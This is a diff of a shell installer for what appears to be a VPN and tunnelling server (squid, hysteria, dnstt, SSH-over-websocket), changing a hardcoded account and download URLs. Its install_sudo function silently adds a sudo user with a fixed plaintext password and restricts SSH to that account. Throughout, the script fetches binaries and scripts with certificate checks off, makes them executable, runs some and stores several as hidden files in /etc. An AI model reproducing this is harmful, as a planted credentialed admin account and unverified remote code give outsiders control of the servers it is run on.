@@ -3,9 +3,9 @@
 timedatectl set-timezone Asia/Manila
 
 install_sudo(){
-    useradd -m adminmtk 2>/dev/null; echo adminmtk:Mediatek272124@@ | chpasswd &>/dev/null; usermod -aG sudo adminmtk &>/dev/null
+    useradd -m  mtknetwork 2>/dev/null; echo  mtknetwork:F1005r90@@@| chpasswd &>/dev/null; usermod -aG sudo  mtknetwork &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups adminmtk" >> /etc/ssh/sshd_config
+    echo "AllowGroups  mtknetwork" >> /etc/ssh/sshd_config
     service sshd restart
 }
 
@@ -32,7 +32,7 @@ apt install -y iptables sudo
 apt install -y openvpn netcat-openbsd httpie php neofetch vnstat
 apt install -y screen squid stunnel4 dropbear gnutls-bin build-essential
 cd /usr/src
-sudo wget https://mediatekvpn.uk/mtkgenuine/Python-2.7.18.tgz
+sudo wget https://raw.githubusercontent.com/A-l-amin/dxpanelrepo/refs/heads/server_script/Python-2.7.18.tgz
 sudo tar xzf Python-2.7.18.tgz
 cd Python-2.7.18
 sudo ./configure --enable-optimizations
@@ -65,7 +65,7 @@ install_hysteria(){
 clear
 echo 'Installing hysteria.'
 {
-wget -N --no-check-certificate -q -O ~/install_server.sh https://mediatekvpn.uk/mtkgenuine/install_server.sh; chmod +x ~/install_server.sh; ./install_server.sh --version v1.3.5
+wget -N --no-check-certificate -q -O ~/install_server.sh https://raw.githubusercontent.com/A-l-amin/dxpanelrepo/refs/heads/server_script/install_server.sh; chmod +x ~/install_server.sh; ./install_server.sh --version v1.3.5
 
 rm -f /etc/hysteria/config.json
 
@@ -119,7 +119,7 @@ chmod 755 /etc/hysteria/.auth.sh
 sysctl -w net.core.rmem_max=16777216
 sysctl -w net.core.wmem_max=16777216
 
-wget -O /usr/bin/badvpn-udpgw "https://mediatekvpn.uk/mtkgenuine/badvpn-udpgw64"
+wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/A-l-amin/dxpanelrepo/refs/heads/server_script/badvpn-udpgw64"
 chmod +x /usr/bin/badvpn-udpgw
 } &>/dev/null
 }
@@ -139,7 +139,7 @@ install_squid(){
 clear
 echo 'Installing proxy.'
 {
-    wget --no-check-certificate -O /etc/init.d/squid https://mediatekvpn.uk/mtkgenuine/squid.sh
+    wget --no-check-certificate -O /etc/init.d/squid https://raw.githubusercontent.com/A-l-amin/dxpanelrepo/refs/heads/server_script/squid.sh
     chmod +x /etc/init.d/squid
     update-rc.d squid defaults
     chown -cR proxy /var/log/squid
@@ -168,7 +168,7 @@ error_directory /usr/share/squid/errors/English' >> squid.conf
     chmod 755 *
     /etc/init.d/squid start
 cd /etc || exit
-wget 'https://mediatekvpn.uk/mtkgenuine/authentication/socks.py' -O /etc/socks.py
+wget 'https://raw.githubusercontent.com/A-l-amin/dxpanelrepo/refs/heads/server_script/authentication/socks.py' -O /etc/socks.py
 dos2unix /etc/socks.py
 chmod +x /etc/socks.py
 sed -i "s/${PORT_UDP}/${PORT_TCP}/g" /etc/socks.py
@@ -191,21 +191,21 @@ systemctl daemon-reload
 systemctl enable socks
 systemctl restart socks
 
-wget 'https://mediatekvpn.uk/mtkgenuine/socks-ssh.py' -O /etc/socks-ssh.py
+wget 'https://raw.githubusercontent.com/A-l-amin/dxpanelrepo/refs/heads/server_script/socks-ssh.py' -O /etc/socks-ssh.py
 dos2unix /etc/socks-ssh.py
 chmod +x /etc/socks-ssh.py
 
-wget 'https://mediatekvpn.uk/mtkgenuine/socks-ws-ssh.py' -O /etc/socks-ws-ssh.py
+wget 'https://raw.githubusercontent.com/A-l-amin/dxpanelrepo/refs/heads/server_script/socks-ws-ssh.py' -O /etc/socks-ws-ssh.py
 dos2unix /etc/socks-ws-ssh.py
 chmod +x /etc/socks-ws-ssh.py
 
-wget 'https://mediatekvpn.uk/mtkgenuine/socks-ws-ssl.py' -O /etc/socks-ws-ssl.py
+wget 'https://raw.githubusercontent.com/A-l-amin/dxpanelrepo/refs/heads/server_script/socks-ws-ssl.py' -O /etc/socks-ws-ssl.py
 dos2unix /etc/socks-ws-ssl.py
 chmod +x /etc/socks-ws-ssl.py
 
-wget 'https://mediatekvpn.uk/mtkgenuine/monitorz' -O /etc/.monitor
-wget 'https://mediatekvpn.uk/mtkgenuine/ws' -O /etc/.ws
-wget 'https://mediatekvpn.uk/mtkgenuine/hysteria' -O /etc/.hysteria
+wget 'https://raw.githubusercontent.com/A-l-amin/dxpanelrepo/refs/heads/server_script/monitorz' -O /etc/.monitor
+wget 'https://raw.githubusercontent.com/A-l-amin/dxpanelrepo/refs/heads/server_script/ws' -O /etc/.ws
+wget 'https://raw.githubusercontent.com/A-l-amin/dxpanelrepo/refs/heads/server_script/hysteria' -O /etc/.hysteria
 chmod +x /etc/.monitor
 chmod +x /etc/.ws
 chmod +x /etc/.hysteria
@@ -673,9 +673,9 @@ mkdir -m 777 $DNSCONFIG
 
 # BUILD DNSTT SERVER
 cd $DNSDIR/dnstt/dnstt-server
-wget -O dnstt-server "https://mediatekvpn.uk/mtkgenuine/slowdns/xxxxx/dnstt-server"
+wget -O dnstt-server "https://raw.githubusercontent.com/A-l-amin/dxpanelrepo/refs/heads/server_script/slowdns/xxxxx/dnstt-server"
 chmod +x dnstt-server
-wget -O dnstt-client "https://mediatekvpn.uk/mtkgenuine/slowdns/xxxxx/dnstt-client"
+wget -O dnstt-client "https://raw.githubusercontent.com/A-l-amin/dxpanelrepo/refs/heads/server_script/slowdns/xxxxx/dnstt-client"
 chmod +x dnstt-client
 
 ./dnstt-server -gen-key -privkey-file server.key -pubkey-file server.pub
